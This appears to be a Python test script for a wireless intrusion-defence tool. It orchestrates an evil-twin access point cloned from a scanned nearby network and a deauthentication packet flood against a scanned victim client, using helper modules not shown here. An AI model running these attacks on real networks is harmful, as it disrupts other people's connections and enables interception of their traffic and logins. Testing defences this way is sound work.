# Test for defence tool

"""
    1. Test level 1: Create twin ap
    same ssid, channel, bssid as nearby ap + change the rssi tx to be extreme difference.
    run hostapd

    2. Test level 2: Send disas & disauth packets

"""

import os
import subprocess
import sys
import threading
import time
from sniffer_filter import scan_victims, set_monitor_mode,scan_networks
from twin_setup import create_evil_ap
from injector import set_injector_adapter, send_disas_packets

INTERFACE = "wlxe84e06aed7c3"
stop_injection = threading.Event()

def reset_services():
    print("[*] Restoring normal network services...")
    subprocess.run(["sudo", "systemctl", "start", "NetworkManager"])

def test_ap_dupe():
    hostapd_proc = None
    try:
        set_monitor_mode(INTERFACE)
        target_ap = scan_networks(INTERFACE,20)
        hostapd_proc = create_evil_ap(INTERFACE,target_ap)
        print("\n[*] Evil AP deployment active. Press Ctrl+C to terminate.")
        while True:
            time.sleep(1) # This keeps the script from falling through to finally
            
            # Optional Safety Check: Ensure hostapd hasn't died in the background
            if hostapd_proc.poll() is not None:
                print("[-] hostapd unexpectedly terminated in the background.")
                break
    
    except KeyboardInterrupt:
        print("\n[!] Stopped attack by user...")

    except Exception as e:
        print(f"got error {e}")

    finally:
        if hostapd_proc is not None:
            try:
                hostapd_proc.terminate()
                hostapd_proc.wait(timeout=2)
            except Exception as e:
                print(f"Error stopping hostapd: {e}")
        else:
            print("hostapd_proc was never started (it is None).")

        reset_services()

def test_disas_packets():
    injection_thread = None
    try:
        set_monitor_mode(INTERFACE)
        target_ap = scan_networks(INTERFACE,20)
        victim = scan_victims(INTERFACE, target_ap, 30)
        set_injector_adapter(INTERFACE,target_ap['channel'])
        injection_thread = threading.Thread(target=send_disas_packets,args=(INTERFACE,victim,target_ap,stop_injection), daemon=True)
        injection_thread.start()
        print("\n[*] Evil AP deployment active. Press Ctrl+C to terminate.")
        while True:
            time.sleep(1) # This keeps the script from falling through to finally
            

    except KeyboardInterrupt:
        print("\n[!] Stopped attack by user...")

    except Exception as e:
        print(f"got error {e}")
    finally:
        stop_injection.set()
        if injection_thread is not None:
            injection_thread.join()
        reset_services()


def main():
    #test_ap_dupe()
    test_disas_packets()


if __name__ == "__main__":
    main()